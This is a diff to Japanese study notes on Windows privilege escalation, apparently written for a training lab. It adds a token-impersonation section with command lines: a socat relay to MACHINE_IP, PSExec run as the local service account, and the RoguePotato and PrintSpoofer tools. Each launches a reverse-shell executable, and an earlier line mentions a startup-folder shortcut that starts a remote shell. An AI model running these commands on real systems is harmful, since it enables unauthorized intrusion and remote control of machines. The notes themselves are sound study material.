@@ -93,11 +93,15 @@ Admin 権限で実行中のアプリから、「ファイル」などのメニ�
 以下、スタートメニューにショートカットを作成して、リモートシェルを起動するようにする
 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 
-【11. リモートデスクトップの悪用】
+【11. Token Impersonation リモートデスクトップの悪用】
 ・方法
 SeImpersonatePrivilege と SeAssignPrimaryTokenPrivilege を利用
 
 sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
 C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
 C:\PrivEsc\RoguePotato.exe -r <MACHINE_IP> -e "C:\PrivEsc\reverse.exe" -l 9999
+
+【12. Token Impersonation】
+C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
 
